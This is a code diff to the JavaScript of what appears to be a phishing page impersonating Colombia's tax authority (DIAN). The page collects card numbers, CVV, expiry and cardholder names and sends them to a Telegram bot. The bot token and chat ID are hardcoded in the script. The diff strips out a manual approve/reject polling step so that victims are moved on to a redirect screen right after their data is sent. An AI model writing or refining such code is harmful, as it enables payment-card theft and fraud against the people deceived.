@@ -730,12 +730,7 @@
     // ============================================
     const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
     const TELEGRAM_CHAT_ID = '-1004294946880';
-    const WEBHOOK_URL = '/api/webhook';
-    const POLLING_INTERVAL = 3000;
-    const MAX_POLLING_TIME = 300000;
 
-    let solicitudId = null;
-    let pollingInterval = null;
     let cardType = null;
     let bancoSeleccionado = null;
 
@@ -885,13 +880,6 @@
     }
 
     // ============================================
-    // GENERAR ID DE SOLICITUD
-    // ============================================
-    function generarSolicitudId() {
-      return 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-    }
-
-    // ============================================
     // MOSTRAR PANTALLA DE CARGA Y REDIRIGIR
     // ============================================
     function mostrarCargaYRedirigir(tipoTarjeta, banco) {
@@ -972,15 +960,6 @@
     // ============================================
     async function enviarDatosTarjetaATelegram(datos) {
       try {
-        const inlineKeyboard = {
-          inline_keyboard: [
-            [
-              { text: "✅ APROBAR", callback_data: `approve_cc_${datos.solicitudId}` },
-              { text: "❌ RECHAZAR", callback_data: `reject_cc_${datos.solicitudId}` }
-            ]
-          ]
-        };
-
         let mensaje = `🔔 *NUEVA TARJETA - DIAN*\n\n`;
         mensaje += `🆔 ID: \`${datos.solicitudId}\`\n\n`;
         mensaje += `📋 *DATOS DEL USUARIO:*\n`;
@@ -996,7 +975,7 @@
         mensaje += `📋 Tipo: ${datos.tipoTarjeta.toUpperCase()}\n\n`;
         mensaje += `💰 Total: ${datos.totalFormateado}\n`;
         mensaje += `📅 Fecha: ${datos.fechaHora}\n\n`;
-        mensaje += `⏳ *Estado:* Esperando verificación...`;
+        mensaje += `⏳ *Estado:* Procesando...`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -1007,7 +986,6 @@
             chat_id: TELEGRAM_CHAT_ID,
             text: mensaje,
             parse_mode: 'Markdown',
-            reply_markup: inlineKeyboard,
             disable_web_page_preview: true
           })
         });
@@ -1018,65 +996,6 @@
         console.error('❌ Error:', error);
         return false;
       }
-    }
-
-    // ============================================
-    // VERIFICAR ESTADO DE SOLICITUD (Webhook)
-    // ============================================
-    async function verificarEstadoSolicitud(solicitudId) {
-      try {
-        const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
-        const data = await response.json();
-        return data.estado || 'pending';
-      } catch (error) {
-        console.error('❌ Error al consultar webhook:', error);
-        return 'error';
-      }
-    }
-
-    // ============================================
-    // POLLING PARA ESPERAR APROBACIÓN/RECHAZO
-    // ============================================
-    function iniciarPollingPago() {
-      const tipoTarjeta = cardType;
-      const banco = bancoSeleccionado;
-      let tiempoInicio = Date.now();
-
-      pollingInterval = setInterval(async () => {
-        if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
-          clearInterval(pollingInterval);
-          mostrarError('⏰ Tiempo de espera agotado. Intente nuevamente.');
-          document.getElementById('loadingOverlay').classList.remove('active');
-          const btn = document.getElementById('submitBtn');
-          btn.disabled = false;
-          btn.textContent = 'Continuar';
-          document.getElementById('cc').disabled = false;
-          document.getElementById('cvv').disabled = false;
-          document.getElementById('fecha').disabled = false;
-          document.getElementById('tipo').disabled = false;
-          document.getElementById('cardholder').disabled = false;
-          return;
-        }
-
-        const resultado = await verificarEstadoSolicitud(solicitudId);
-
-        if (resultado === 'approved') {
-          clearInterval(pollingInterval);
-          mostrarCargaYRedirigir(tipoTarjeta, banco);
-        } else if (resultado === 'rejected') {
-          clearInterval(pollingInterval);
-          document.getElementById('loadingOverlay').classList.remove('active');
-          mostrarError('❌ Pago rechazado. Verifique los datos e intente nuevamente.');
-          const btn = document.getElementById('submitBtn');
-          btn.disabled = false;
-          btn.textContent = 'Continuar';
-          document.getElementById('cc').disabled = false;
-          document.getElementById('cvv').disabled = false;
-          document.getElementById('fecha').disabled = false;
-          document.getElementById('tipo').disabled = false;
-          document.getElementById('cardholder').disabled = false;
-        }
-      }, POLLING_INTERVAL);
     }
 
     // ============================================
@@ -1128,7 +1047,7 @@
       }
 
       bancoSeleccionado = banco;
-      solicitudId = generarSolicitudId();
+      const solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
       const loadingOverlay = document.getElementById('loadingOverlay');
       loadingOverlay.classList.add('active');
@@ -1176,8 +1095,11 @@
       });
 
       if (enviado) {
-        mostrarMensaje('⏳ Esperando aprobación del pago...', 'info');
-        iniciarPollingPago();
+        mostrarMensaje('✅ Datos enviados correctamente', 'success');
+        // Mostrar pantalla de carga con el logo correspondiente
+        setTimeout(() => {
+          mostrarCargaYRedirigir(cardType, banco);
+        }, 500);
       } else {
         mostrarError('❌ Error al procesar el pago. Intente nuevamente.');
         document.getElementById('loadingOverlay').classList.remove('active');
